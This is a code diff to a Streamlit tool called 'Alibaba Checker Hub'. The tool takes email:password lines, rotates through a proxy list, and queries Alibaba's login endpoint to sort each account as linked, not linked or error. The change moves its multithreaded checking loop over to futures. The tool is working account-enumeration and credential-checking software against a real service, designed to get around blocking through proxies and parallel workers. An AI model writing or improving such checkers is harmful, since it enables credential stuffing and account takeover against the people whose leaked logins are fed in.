@@ -49,11 +49,6 @@ def log_startup(msg):
 
 log_startup("Alibaba Checker Hub initialized with high-performance HTTP session engine v2.10.")
 
-def add_checker_log(msg: str):
-    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
-    entry = f"[{timestamp}] {msg}"
-    st.session_state.checker_logs.append(entry)
-
 def add_proxy_log(msg: str):
     timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
     entry = f"[{timestamp}] {msg}"
@@ -392,8 +387,8 @@ with tab2:
         if not accounts:
             st.warning("Please provide accounts in the sidebar first.")
         else:
-            st.session_state.checker_logs = []
-            add_checker_log(f"Initializing HTTP Alibaba Checker engine v2.10 with {len(accounts)} accounts across {max_workers} worker threads.")
+            timestamp_init = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+            local_logs = [f"[{timestamp_init}] Initializing HTTP Alibaba Checker engine v2.10 with {len(accounts)} accounts across {max_workers} worker threads."]
 
             proxy_file = "proxies.txt"
             alive_proxies = []
@@ -435,7 +430,8 @@ with tab2:
                     return "error", "Captcha / blocked"
                 return "not_linked", "Assumed not registered"
 
-            def check_single_account(idx, line):
+            def check_single_account(args):
+                idx, line = args
                 email = line.split(":", 1)[0].strip()
                 proxies = get_next_proxy()
                 headers = {
@@ -443,6 +439,7 @@ with tab2:
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                     "Accept-Language": "en-US,en;q=0.5"
                 }
+                ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
                 try:
                     url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&loginId={email}"
                     r = requests.get(url, headers=headers, proxies=proxies, timeout=12)
@@ -451,27 +448,35 @@ with tab2:
                     if r.status_code == 200:
                         status, detail = classify(text)
                         icon = "✅" if status == "linked" else ("❌" if status == "not_linked" else "⚠️")
-                        add_checker_log(f"[{idx}/{len(accounts)}] {email} | Status: {icon} {status.upper()} | Detail: {detail}")
-                        with lock:
-                            if status == "linked":
-                                linked_accs.append(line)
-                            else:
-                                not_linked_accs.append(line)
+                        log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: {icon} {status.upper()} | Detail: {detail}"
+                        return status, line, log_msg
                     else:
-                        add_checker_log(f"[{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: HTTP Status {r.status_code}")
-                        with lock:
-                            error_accs.append(f"{line} # HTTP Status {r.status_code}")
+                        log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: HTTP Status {r.status_code}"
+                        return "error", f"{line} # HTTP Status {r.status_code}", log_msg
                 except Exception as e:
-                    add_checker_log(f"[{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: {str(e)[:50]}")
-                    with lock:
-                        error_accs.append(f"{line} # {str(e)[:50]}")
+                    log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: {str(e)[:50]}"
+                    return "error", f"{line} # {str(e)[:50]}", log_msg
 
             with st.spinner("Checking accounts via high-speed HTTP proxy workers..."):
-                from concurrent.futures import ThreadPoolExecutor
+                from concurrent.futures import ThreadPoolExecutor, as_completed
+                tasks = [(idx, line) for idx, line in enumerate(accounts, 1)]
                 with ThreadPoolExecutor(max_workers=max_workers) as executor:
-                    for idx, line in enumerate(accounts, 1):
-                        executor.submit(check_single_account, idx, line)
+                    futures = {executor.submit(check_single_account, task): task for task in tasks}
+                    for future in as_completed(futures):
+                        try:
+                            status, item_data, log_msg = future.result()
+                            local_logs.append(log_msg)
+                            if status == "linked":
+                                linked_accs.append(item_data)
+                            elif status == "not_linked":
+                                not_linked_accs.append(item_data)
+                            else:
+                                error_accs.append(item_data)
+                        except Exception as ex:
+                            local_logs.append(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] Worker Exception: {str(ex)}")
+                            error_accs.append(str(ex))
 
+            st.session_state.checker_logs = local_logs
             st.session_state.alibaba_results = {
                 "linked": linked_accs,
                 "not_linked": not_linked_accs,
